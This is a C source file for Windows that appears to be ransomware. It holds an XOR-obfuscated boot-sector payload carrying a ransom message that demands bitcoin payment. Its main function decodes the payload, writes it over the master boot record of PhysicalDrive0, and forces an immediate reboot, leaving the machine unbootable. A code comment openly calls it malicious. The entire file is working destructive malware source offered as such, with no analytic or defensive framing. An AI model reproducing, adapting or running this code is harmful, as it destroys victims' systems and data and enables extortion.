#include <stdio.h>
#include <windows.h>

typedef unsigned char uint8_t;
#define MBR_SIZE 512

/* See tools/encrypt0r.c */
uint8_t Data_mbr[MBR_SIZE] = {
	0x4, 
	0xf5, 0x8d, 0x35, 0x49, 0xbc, 0xf1, 0xbc, 0xd0, 0x81, 0x35, 0x85, 0x36, 0xf8, 0x25, 0x8e, 0x8b, 
	0x34, 0x8b, 0x35, 0x35, 0xb6, 0xcb, 0x5,  0x41, 0x3d, 0xb4, 0x2,  0x71, 0xca, 0x73, 0x76, 0xde, 
	0xc6, 0x8e, 0x67, 0x49, 0xdd, 0x5b, 0x34, 0x4,  0xc3, 0x4,  0xf5, 0xf8, 0x23, 0xbd, 0xd0, 0x81, 
	0x3b, 0xf8, 0x25, 0xbd, 0xb1, 0x9c, 0x48, 0x9,  0x38, 0x41, 0x36, 0x73, 0xde, 0xde, 0xb5, 0xb, 
	0x9c, 0x48, 0x53, 0x40, 0x37, 0x41, 0xcb, 0x8e, 0x75, 0x48, 0xdd, 0x7d, 0x34, 0xde, 0xcb, 0xde, 
	0xcb, 0x6c, 0x5a, 0x40, 0x15, 0x5d, 0x54, 0x43, 0x50, 0x15, 0x5f, 0x40, 0x46, 0x41, 0x15, 0x57, 
	0x50, 0x50, 0x5b, 0x15, 0x5c, 0x5b, 0x53, 0x50, 0x56, 0x41, 0x50, 0x51, 0x15, 0x57, 0x4c, 0x15, 
	0x72, 0x63, 0x67, 0x18, 0x2,  0x5,  0x5,  0x14, 0x15, 0x6c, 0x5a, 0x40, 0x47, 0x15, 0x78, 0x73, 
	0x61, 0x15, 0x5d, 0x54, 0x46, 0x15, 0x57, 0x50, 0x50, 0x5b, 0x15, 0x50, 0x5b, 0x56, 0x47, 0x4c, 
	0x45, 0x41, 0x50, 0x51, 0x1b, 0x38, 0x3f, 0x65, 0x54, 0x4c, 0x15, 0x11, 0x6,  0x5,  0x5,  0x15, 
	0x60, 0x66, 0x71, 0x15, 0x42, 0x5a, 0x47, 0x41, 0x5d, 0x15, 0x5a, 0x53, 0x15, 0x77, 0x61, 0x76, 
	0x15, 0x41, 0x5a, 0x15, 0x4,  0x3,  0x6,  0x73, 0x47, 0x53, 0x63, 0x6d, 0x7,  0x77, 0x76, 0x71, 
	0x52, 0x42, 0x71, 0x45, 0x60, 0x62, 0x72, 0x5b, 0x61, 0x53, 0x41, 0x4f, 0x65, 0x42, 0x70, 0x78, 
	0x53, 0x45, 0x5d, 0x63, 0x71, 0x70, 0x1b, 0x15, 0x70, 0x58, 0x54, 0x5c, 0x59, 0x15, 0x45, 0x47, 
	0x5a, 0x5a, 0x53, 0x15, 0x41, 0x5a, 0x15, 0x4f, 0x51, 0x58, 0x54, 0x5f, 0x75, 0x50, 0x4d, 0x54, 
	0x58, 0x45, 0x59, 0x50, 0x1b, 0x56, 0x5a, 0x58, 0x1b, 0x15, 0x62, 0x50, 0x15, 0x42, 0x5c, 0x59, 
	0x59, 0x15, 0x46, 0x50, 0x5b, 0x51, 0x15, 0x41, 0x5d, 0x50, 0x15, 0x5e, 0x50, 0x4c, 0x15, 0x5a, 
	0x5b, 0x56, 0x50, 0x15, 0x42, 0x50, 0x15, 0x52, 0x50, 0x41, 0x15, 0x56, 0x5a, 0x5b, 0x53, 0x5c, 
	0x47, 0x58, 0x54, 0x41, 0x5c, 0x5a, 0x5b, 0x15, 0x5a, 0x53, 0x15, 0x41, 0x47, 0x54, 0x5b, 0x46, 
	0x54, 0x56, 0x41, 0x5c, 0x5a, 0x5b, 0x1b, 0x38, 0x3f, 0x7e, 0x50, 0x4c, 0xb, 0x15, 0x35, 0x38, 
	0x3f, 0x62, 0x47, 0x5a, 0x5b, 0x52, 0x14, 0x15, 0x6c, 0x5a, 0x40, 0x12, 0x47, 0x50, 0x15, 0x46, 
	0x41, 0x40, 0x56, 0x5e, 0x15, 0x5d, 0x50, 0x47, 0x50, 0x15, 0x5b, 0x5a, 0x42, 0x1b, 0x15, 0x7c, 
	0x53, 0x15, 0x4c, 0x5a, 0x40, 0x15, 0x47, 0x50, 0x57, 0x5a, 0x5a, 0x41, 0x15, 0x4c, 0x5a, 0x40, 
	0x12, 0x47, 0x50, 0x15, 0x52, 0x5a, 0x5b, 0x5b, 0x54, 0x15, 0x58, 0x54, 0x5e, 0x50, 0x15, 0x50, 
	0x43, 0x50, 0x47, 0x4c, 0x41, 0x5d, 0x5c, 0x5b, 0x52, 0x15, 0x42, 0x5a, 0x47, 0x46, 0x50, 0x14, 
	0x14, 0x15, 0x9,  0x6,  0x35, 0x65, 0x66, 0x81, 0x3b, 0xb5, 0xa,  0x35, 0x41, 0x32, 0xbf, 0x32, 
	0xf8, 0x25, 0x76, 0xde, 0xc1, 0x6d, 0x6e, 0xf6, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 
	0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 
	0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 
	0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 
	0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 
	0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x60, 0x9f
};

int main(void) {
	// Un-XOR the boot sector code
	for(size_t i = 0; i != 512; i++) Data_mbr[i] = Data_mbr[i] ^ '\x35';
	// Override MBR with our malicious code
	HANDLE mbr = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, NULL, NULL);
	DWORD write;
	WriteFile(mbr, Data_mbr, MBR_SIZE, &write, NULL);
	CloseHandle(mbr);

	// Force a reboot
  // 2024-16-02
  /* This is such a hacky way to do it.
   * Alot of the methods I've tried have not worked, but we use
   * cmd to shutdown -- we don't even need the /t flag.
  */
	system("shutdown /r /t 00");
	return 0;
}